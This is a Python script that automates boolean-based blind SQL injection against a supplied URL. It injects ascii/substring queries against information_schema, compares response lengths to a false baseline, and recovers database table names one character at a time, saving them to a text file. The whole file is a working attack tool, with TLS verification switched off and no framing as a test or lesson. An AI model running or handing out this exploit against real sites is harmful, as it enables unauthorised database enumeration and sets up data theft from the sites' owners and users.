# imports
from colorama.ansi import Fore
import requests, urllib3, time
from colorama import Fore

def start(url_input):

    # Disable Warnings
    urllib3.disable_warnings()

    # Get Wrong Output
    test_url = f"{url_input}' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1000--+"
    false_result = requests.get(test_url, verify=False).content
    false_Length = len(false_result)

    # Attack Loop
    table = []
    for j in range(0, int(50)):
        print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{j}] Table"+Fore.RESET)
        i = 0

        # Word Finder Loop
        for i in range(1, 15):
            print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{i}] START\n"+Fore.RESET+' --------')
            flag = False

            # Ascci Finder Loop
            for a in range(90, 127):
                url = f"{url_input}' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1))={a}--+"
                result = requests.get(url, verify=False).content
                print (f' {a} | False')

                # Loop Checker Condition
                if len(result) != false_Length:
                    flag = True
                    print (Fore.LIGHTGREEN_EX+f"\n Character Found! --> [{a}] | [{chr(a)}]\n"+Fore.RESET)
                    table.append(chr(a))
                    time.sleep(2)
                    break

            # Loop Checker Condition
            if flag == False:
                print (Fore.RED+"\n Finish!"+Fore.RESET)
                break
        
        # Print Result
        print(Fore.LIGHTGREEN_EX+'\n Result --> '+Fore.RESET, end='')
        empty = ''
        table_name = empty.join(table)
        print (Fore.LIGHTGREEN_EX+f'{table_name}'+Fore.RESET)

        # Save Result in a txt file
        with open('Tables_DB.txt', 'a+') as tt:
            tt.write(f'{table_name}\n')

        # clear list for next table
        table.clear()
        print('\n')